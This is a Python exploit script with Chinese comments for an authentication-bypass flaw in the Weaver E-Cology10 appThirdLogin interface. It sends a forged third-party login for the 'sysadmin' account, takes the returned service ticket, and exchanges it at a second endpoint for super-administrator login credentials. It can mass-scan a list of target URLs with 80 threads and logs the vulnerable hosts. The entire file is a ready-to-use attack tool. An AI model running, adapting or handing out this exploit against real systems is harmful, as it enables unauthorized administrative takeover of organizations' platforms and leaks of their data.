# -*- coding: utf-8 -*-
# 泛微E-Cology10 appThirdLogin 身份认证绕过漏洞
# icon_hash="-1619753057"
# 产品简介:泛微E-Cology10是一款先进的数字化运营平台，由上海泛微网络科技股份有限公司推出并持续优化。旨在帮助各类组织构建一个全面的数字化平台，以实现应用的搭建、系统的集成以及数据的打通。该平台支持组织内部多个部门(如人事、市场、销售、项目、客服、财务、采购等)的协同工作，并促进与外部供应商、代理商、客户及合作伙伴的实时互通，从而构建一个内外部协同的数字化运营体系，提升组织的智能化、协同性和效率。
# 漏洞概述:泛微E-Cology10 appThirdLogin 接口存在身份认证绕过漏洞，未经身份验证的远程攻击者可以利用此接口获取登录凭据信息，拿到凭据后可绕过身份认证，使用超级管理员账户登录系统后台，造成信息泄露或者恶意破坏，使系统处于极不安全的状态。
# POST型/身份认证绕过/正则表达式

import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
            \x1b[38m███████╗     ██████╗ ██████╗ ██╗      ██████╗  ██████╗██╗   ██╗
            \x1b[36m██╔════╝    ██╔════╝██╔═══██╗██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝
            \x1b[34m█████╗█████╗██║     ██║   ██║██║     ██║   ██║██║  ███╗╚████╔╝ 
            \x1b[35m██╔══╝╚════╝██║     ██║   ██║██║     ██║   ██║██║   ██║ ╚██╔╝  
            \x1b[31m███████╗    ╚██████╗╚██████╔╝███████╗╚██████╔╝╚██████╔╝  ██║   
            \x1b[33m╚══════╝     ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝   ╚═╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
        --author:Kucei  --Version:泛微E-Cology10 appThirdLogin 身份认证绕过漏洞
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser('泛微E-Cology10_appThirdLogin_身份认证绕过漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload1 = '/papi/passport/rest/appThirdLogin'
    url_payload2 = '/papi/passport/login/generateEteamsId'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data1 = 'username=sysadmin&service=1&ip=1&loginType=third'
    try :
        response1 = requests.post(url=target+url_payload1,headers=headers,data=data1,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        # ****************正则表达式********************* #
        # 正则表达式模式，用于匹配 serviceTicketId 的值
        pattern = r'"serviceTicketId":"(ST-[^"]+)"'
        # 使用 re.search 查找匹配的内容
        match = re.search(pattern, response1.text)
        if match:
            # 提取到的 serviceTicketId
            service_ticket_id = match.group(1)
            print(service_ticket_id)
        else:
            print("No serviceTicketId found in the response-无法利用")
        # ****************正则表达式********************* #
        if response1.status_code == 200 and service_ticket_id != ' ':
            data2 = 'stTicket=' + service_ticket_id
            print(data2)
            try :
                response2 = requests.post(url=target+url_payload2,headers=headers,data=data2,verify=False,timeout=5)
                pattern = r'"data":"([^"]+)"'
                match = re.search(pattern, response2.text)
                print(match)
                data_value = match.group(1)
                if response2.status_code == 200 and data_value != ' ':
                    print( f"[+] {target} 存在漏洞！\n" + "###data=" + data_value)
                    with open('泛微E-Cology10_appThirdLogin.txt','a',encoding='utf-8')as f:
                        f.write(target+url_payload1+'\n')
                        return True
            except Exception:
                print(target+"站点连接异常")
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()